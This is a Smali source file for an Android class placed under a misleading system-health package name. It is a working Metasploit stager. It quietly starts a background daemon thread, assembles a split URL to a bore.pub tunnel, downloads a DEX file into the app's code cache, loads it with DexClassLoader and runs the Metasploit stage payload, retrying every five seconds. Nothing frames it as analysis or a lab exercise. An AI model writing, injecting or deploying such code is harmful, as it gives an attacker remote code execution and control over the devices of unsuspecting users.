.class public Lcom/android/system/health/Payload;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

.field private static volatile started:Z
.field private context:Landroid/content/Context;

.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lcom/android/system/health/Payload;->context:Landroid/content/Context;
    return-void
.end method

.method public static start(Landroid/content/Context;)V
    .locals 2
    sget-boolean v0, Lcom/android/system/health/Payload;->started:Z
    if-nez v0, :done
    const/4 v0, 0x1
    sput-boolean v0, Lcom/android/system/health/Payload;->started:Z
    :try_s
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/android/system/health/Payload;
    invoke-direct {v1, p0}, Lcom/android/system/health/Payload;-><init>(Landroid/content/Context;)V
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    const/4 v1, 0x1
    invoke-virtual {v0, v1}, Ljava/lang/Thread;->setDaemon(Z)V
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_e
    .catch Ljava/lang/Exception; {:try_s .. :try_e} :catch_s
    :done
    return-void
    :catch_s
    move-exception v0
    return-void
.end method

.method public run()V
    .locals 10

    iget-object v9, p0, Lcom/android/system/health/Payload;->context:Landroid/content/Context;

    :loop_top

    :try_dl
    # Build URL: "http://bore" + ".pub:36980/s.dex"
    const-string v0, "http://bore"
    const-string v1, ".pub:21062/s.dex"
    invoke-virtual {v0, v1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0

    new-instance v1, Ljava/net/URL;
    invoke-direct {v1, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/net/URL;->openStream()Ljava/io/InputStream;
    move-result-object v1

    invoke-virtual {v9}, Landroid/content/Context;->getCodeCacheDir()Ljava/io/File;
    move-result-object v2

    new-instance v3, Ljava/io/File;
    const-string v4, "s.dex"
    invoke-direct {v3, v2, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    new-instance v4, Ljava/io/FileOutputStream;
    invoke-direct {v4, v3}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    const/16 v5, 0x1000
    new-array v5, v5, [B

    :read_loop
    invoke-virtual {v1, v5}, Ljava/io/InputStream;->read([B)I
    move-result v6
    const/4 v7, -0x1
    if-eq v6, v7, :read_done
    const/4 v7, 0x0
    invoke-virtual {v4, v5, v7, v6}, Ljava/io/OutputStream;->write([BII)V
    goto :read_loop

    :read_done
    invoke-virtual {v4}, Ljava/io/OutputStream;->close()V
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v0

    invoke-virtual {v9}, Landroid/content/Context;->getCodeCacheDir()Ljava/io/File;
    move-result-object v1
    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v1

    invoke-virtual {v9}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object v2

    new-instance v3, Ldalvik/system/DexClassLoader;
    const/4 v4, 0x0
    invoke-direct {v3, v0, v1, v4, v2}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    const-string v0, "com.metasploit.stage.Payload"
    invoke-virtual {v3, v0}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
    move-result-object v0

    const/4 v1, 0x1
    new-array v1, v1, [Ljava/lang/Class;
    const-class v2, Landroid/content/Context;
    const/4 v3, 0x0
    aput-object v2, v1, v3
    const-string v2, "start"
    invoke-virtual {v0, v2, v1}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    move-result-object v1

    const/4 v2, 0x1
    new-array v2, v2, [Ljava/lang/Object;
    const/4 v3, 0x0
    aput-object v9, v2, v3
    const/4 v3, 0x0
    invoke-virtual {v1, v3, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    :try_dl_end
    .catch Ljava/lang/Exception; {:try_dl .. :try_dl_end} :catch_err

    return-void

    :catch_err
    move-exception v0
    const-wide/16 v1, 0x1388
    :try_sleep
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_sleep_end
    .catch Ljava/lang/Exception; {:try_sleep .. :try_sleep_end} :catch_sleep
    :catch_sleep
    goto :loop_top
.end method
